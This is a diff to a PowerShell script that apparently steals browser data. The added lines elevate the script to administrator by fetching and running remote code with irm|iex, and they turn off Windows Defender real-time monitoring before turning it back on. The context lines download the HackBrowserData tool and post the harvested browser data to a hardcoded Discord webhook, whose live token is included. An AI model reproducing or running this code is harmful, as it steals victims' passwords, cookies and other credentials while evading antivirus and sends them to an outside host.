@@ -1,3 +1,12 @@
+# Self-elevation to admin
+if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    Start-Process powershell.exe -Verb RunAs -ArgumentList "-EP Bypass -Command irm https://raw.githubusercontent.com/nigmaBoy/pico/refs/heads/main/browserr|iex"
+    exit
+}
+
+# Temporarily disable Windows Defender real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+
 # Discord Webhook
 $webhook = "https://discord.com/api/webhooks/1467247480428171385/TSirVX8AGKGeYAOImDkrGzyQGQjgGRMq6_E-zkv8UTIzu5jBzFGIC4ug15xtQSTys27R"
 
@@ -22,9 +31,6 @@ $tempDir = "$env:TEMP\hbd_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
 
 try {
-    # Add temp directory to Windows Defender exclusion
-    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
-    
     # Download HackBrowserData
     $hbdUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-windows-64bit.zip"
     $zipPath = "$tempDir\hbd.zip"
@@ -68,8 +74,10 @@ try {
 }
 
 # Clean up
-Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
 Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+
+# Re-enable Windows Defender real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
 
 # === Format and Send ===
 $output = @"
@@ -95,3 +103,6 @@ if($output.Length -gt $maxLen) {
     $body = @{ content = $output } | ConvertTo-Json
     Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType 'application/json'
 }
+
+# Auto-close PowerShell after sending
+exit
